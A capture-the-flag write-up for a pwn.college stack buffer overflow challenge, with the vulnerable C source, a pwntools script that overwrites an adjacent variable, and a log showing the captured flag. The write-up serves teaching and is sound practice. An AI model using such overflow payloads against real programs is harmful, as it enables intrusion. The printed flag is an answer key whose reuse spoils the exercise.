# Binary Exploitation

## Your First Overflow (hard)

### Solve :

**Flag:** `pwn.college{YpLUq9AmxKFeW2ljjvL2EsJkDm4.dBTOywSO5EzNzEzW}`

Opening the `.c` file for the challenge, i got
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void bin_padding()
{
    asm volatile (".rept 427; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[78];
        int win_variable;
    } data  = {0} ;

    unsigned long size = 0;

    size = 4096;

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    if (data.win_variable)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```
This contains the struct,
```c
struct {
    char input[78];     
    int win_variable;    
} data = {0};

```
The read function reads 4096 bytes, but the input only allowed for 78 bytes of input.
To overcome this,  
```python
from pwn import *

r = process('./binary-exploitation-first-overflow-hard')
r.send(b'A'*80 + p32(1))
print(r.readall())
```
and ran it using `python3 -c "from pwn import *; r = process('./binary-exploitation-first-overflow-hard'); r.send(b'A'*80 + p32(1)); print(r.readall())"`

In this snippet, `b'A'*80` overflows the buffer which is of 78 bytes + 2 padding bytes.

I got the flag with this.
```
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ python3 -c "from pwn import *; r = process('./binary-exploitation-first-overflow')
; r.send(b'A'*80 + p32(1)); print(r.readall())""
[+] Starting local process './binary-exploitation-first-overflow': pid 153
[+] Receiving all data: Done (135B)
[*] Process './binary-exploitation-first-overflow' stopped with exit code 0 (pid 153)
b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{YpLUq9AmxKFeW2ljjvL2EsJkDm4.dBTOywSO5EzNzEzW}\n\n\nGoodbye!\n'
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ 
```
